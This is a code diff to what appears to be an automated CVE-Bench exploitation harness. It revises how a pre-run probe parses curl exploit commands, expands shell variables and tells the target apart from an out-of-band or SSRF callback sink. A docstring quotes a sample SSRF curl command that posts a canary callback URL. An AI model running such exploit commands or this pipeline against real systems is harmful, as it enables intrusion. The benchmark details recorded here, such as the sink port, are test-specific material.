@@ -36746,6 +36746,118 @@ def _resolve_target_url(target_url, ip, port, endpoint_hint, hint):
     return (ip, port, composed or None)
 
 
+def _expand_simple_assignments(command: str) -> str:
+    """Substitute the command's OWN leading `VAR=value` assignments into it.
+
+    The probe reads a URL out of the command text without running a shell, so
+    `CANARY=POCz4fea7e473a; curl ... "http://t:9091/$CANARY"` was probed with
+    a literal `/$CANARY` path, 404'd, and the command was refused — a command
+    the shell would have expanded correctly. Every $-bearing probe failure in
+    the trace archive is this shape: the variable is always set.
+
+    Only plain `NAME=value` / `NAME='value'` / `NAME="value"` with no
+    substitution of their own, and only the forms this actually sees. A
+    `$(...)` capture is left alone: its value is unknowable without running
+    it, which is the thing we are avoiding.
+    """
+    import re as _re
+    out = command or ""
+    for m in _re.finditer(r"(?:^|[;&]\s*)\s*([A-Za-z_][A-Za-z0-9_]*)="
+                          r"(?:'([^']*)'|\"([^\"$`]*)\"|([^\s;&|'\"$`]+))",
+                          out):
+        name = m.group(1)
+        val = m.group(2) or m.group(3) or m.group(4) or ""
+        if not val:
+            continue
+        out = out.replace("${%s}" % name, val).replace("$%s" % name, val)
+    return out
+
+
+#: curl flags whose VALUE is payload/metadata, never the request target. A URL
+#: appearing as one of these is the thing being sent, not the thing being
+#: contacted — the distinction the probe used to miss on every SSRF and
+#: out-of-band command.
+_CURL_VALUE_FLAGS = frozenset({
+    "-d", "--data", "--data-raw", "--data-binary", "--data-ascii",
+    "--data-urlencode", "-F", "--form", "--form-string", "-H", "--header",
+    "-b", "--cookie", "-c", "--cookie-jar", "-e", "--referer", "-A",
+    "--user-agent", "-o", "--output", "-w", "--write-out", "-u", "--user",
+    "-x", "--proxy", "--proxy-user", "-T", "--upload-file", "--url-query",
+})
+
+
+def _curl_target_url(command: str):
+    """(method, url) curl would actually REQUEST, or (method, None).
+
+    The probe used to take the first `https?://` anywhere in the command. For
+    an SSRF or out-of-band exploit the first URL is the PAYLOAD —
+
+        curl -X POST -d "http://t:9091/$CANARY" 'http://t:9090/api/proxy'
+
+    — so it probed the attacker's own callback sink, got 404 (correctly: the
+    sink has no such path until the exploit fires), and refused the command.
+    296 probe failures in the archive, 8 in the 20-CVE run of 2026-10-19.
+
+    The host guard did not save it. It accepted any port on the target IP
+    (`startswith(f"{ip}:")`), and CVE-Bench puts the oracle/sink on the SAME
+    IP at 9091 — so the one environment this runs in is the one where that
+    check cannot tell a sink from a target.
+    """
+    import shlex as _shlex
+    import re as _re
+    method = "GET"
+    m = _re.search(r"-X\s+([A-Z]+)", command or "")
+    if m:
+        method = m.group(1).upper()
+    # Tokenise ONCE, quote-aware, then find the segment. Splitting the raw
+    # string on `;`/`&&` first is wrong for the same reason the original
+    # first-URL-wins was: a separator inside a quoted value is not a
+    # separator. `-H 'Content-Type: text/plain;charset=UTF-8'` carries a
+    # semicolon, and splitting on it cut the command mid-quote.
+    try:
+        toks = _shlex.split(command or "")
+    except Exception:  # noqa: BLE001 — unbalanced quotes are caught elsewhere
+        return method, None
+    _SEPS = {";", "&&", "||", "|", "&"}
+    seen_curl = False
+    skip_next = False
+    explicit = None
+    candidates = []
+    for i, t in enumerate(toks):
+        if t in _SEPS:
+            if seen_curl:
+                break      # first curl segment only; a trailing verification
+                           # curl is not the exploit
+            skip_next = False
+            continue
+        if skip_next:
+            skip_next = False
+            continue
+        if t == "curl" or t.endswith("/curl"):
+            seen_curl = True
+            continue
+        if not seen_curl:
+            continue       # still in a leading assignment / another program
+        if t == "--url":
+            skip_next = True
+            explicit = toks[i + 1] if i + 1 < len(toks) else None
+            continue
+        if t in _CURL_VALUE_FLAGS:
+            skip_next = True
+            continue
+        if "=" in t and t.split("=", 1)[0] in _CURL_VALUE_FLAGS:
+            continue          # --data=... inline form
+        if t.startswith("-"):
+            continue
+        if t in (">", ">>", "2>", "2>&1", "<"):
+            skip_next = t not in ("2>&1",)
+            continue
+        if t.startswith("http://") or t.startswith("https://"):
+            candidates.append(t)
+    url = explicit or (candidates[0] if candidates else None)
+    return method, url
+
+
 def _prerun_payload_probe(ip, port, command: str, timeout: int = 5) -> dict:
     """Lightweight method-aware endpoint probe before executing the real exploit.
 
@@ -36771,25 +36883,31 @@ def _prerun_payload_probe(ip, port, command: str, timeout: int = 5) -> dict:
 
     # Parse the first `curl ... URL` chunk out of a possibly chained command.
     # Prefer explicit `-X METHOD`, else infer GET (curl's default).
-    method = "GET"
-    m_method = _re.search(r"-X\s+([A-Z]+)", command)
-    if m_method:
-        method = m_method.group(1).upper()
-    # URL extraction: look for the first scheme://host[:port]/path. Must point
-    # to the target host (not localhost / 169.254 / sink / other). If URL
-    # doesn't match the target, we're probably probing an OOB listener or an
-    # SSRF-dest — skip, don't block.
-    m_url = _re.search(r"https?://([^\s'\"`]+)", command)
-    if not m_url:
+    # Expand the command's own VAR= assignments first: without this a
+    # perfectly good `CANARY=POCz...; curl ".../$CANARY"` was probed with the
+    # literal `$CANARY` in the path and refused on the resulting 404.
+    command = _expand_simple_assignments(command)
+    # The URL curl will REQUEST — not the first URL in the string, which for
+    # an SSRF or OOB command is the payload's callback destination.
+    method, url = _curl_target_url(command)
+    if not url:
         return {"ok": True, "skipped": True, "reason": "no HTTP URL in command — not an HTTP exploit"}
-    url = "http" + command[m_url.start()+4 : m_url.end()]  # keep scheme as-is
-    # Strip trailing shell/quote junk the regex may have grabbed.
     url = _re.sub(r"[\"'`;&|]+$", "", url).rstrip()
-    host_part = m_url.group(1).split("/", 1)[0]
-    target_hosts = {str(ip), f"{ip}:{port}", f"{ip}:{port or 80}"}
-    if host_part not in target_hosts and not host_part.startswith(f"{ip}:"):
+    host_part = url.split("//", 1)[-1].split("/", 1)[0]
+    # EXACT host:port when a port is known. The old check accepted any port on
+    # the target IP, and CVE-Bench runs its oracle/sink on the SAME IP at 9091
+    # — so the guard meant to skip "OOB/SSRF dest" passed the sink through as
+    # if it were the target.
+    if port:
+        target_hosts = {f"{ip}:{port}"}
+        if str(port) in ("80", "443"):
+            target_hosts.add(str(ip))
+    else:
+        target_hosts = {str(ip), f"{ip}:80", f"{ip}:443"}
+    if host_part not in target_hosts:
         return {"ok": True, "skipped": True,
-                "reason": f"URL host {host_part!r} is not the target {ip!r} — probably OOB/SSRF dest"}
+                "reason": f"URL host {host_part!r} is not the target {ip}:{port} — "
+                          f"probably an OOB sink or SSRF destination"}
 
     # Probe. Prefer the exploit's own method so a path that is GET-only but
     # exploited with POST is correctly caught. Use `httpx.request` so any
